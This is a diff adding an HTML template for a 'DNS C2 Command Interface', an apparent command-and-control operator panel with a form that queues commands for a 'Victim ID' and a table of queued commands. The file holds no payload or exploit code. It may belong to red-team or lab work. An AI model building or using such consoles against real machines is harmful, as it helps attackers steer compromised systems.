@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DNS C2 Command Interface</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .form-container { max-width: 600px; margin: auto; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; }
+        input, textarea { width: 100%; padding: 8px; }
+        button { padding: 10px 20px; background-color: #007bff; color: white; border: none; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+        .message { color: green; margin-top: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>DNS C2 Command Interface</h2>
+        <form method="POST">
+            <div class="form-group">
+                <label for="victim_id">Victim ID</label>
+                <input type="text" id="victim_id" name="victim_id" required>
+            </div>
+            <div class="form-group">
+                <label for="command">Command</label>
+                <textarea id="command" name="command" rows="4" required></textarea>
+            </div>
+            <button type="submit">Set Command</button>
+        </form>
+        {% if message %}
+            <p class="message">{{ message }}</p>
+        {% endif %}
+        {% if queue %}
+            <h3>Command Queue</h3>
+            <table>
+                <tr>
+                    <th>Victim ID</th>
+                    <th>Command</th>
+                    <th>Status</th>
+                    <th>Timestamp</th>
+                </tr>
+                {% for victim_id, commands in queue.items() %}
+                    {% for cmd in commands %}
+                        <tr>
+                            <td>{{ victim_id }}</td>
+                            <td>{{ cmd.command }}</td>
+                            <td>{{ cmd.status }}</td>
+                            <td>{{ cmd.timestamp | datetime }}</td>
+                        </tr>
+                    {% endfor %}
+                {% endfor %}
+            </table>
+        {% endif %}
+    </div>
+</body>
+</html>
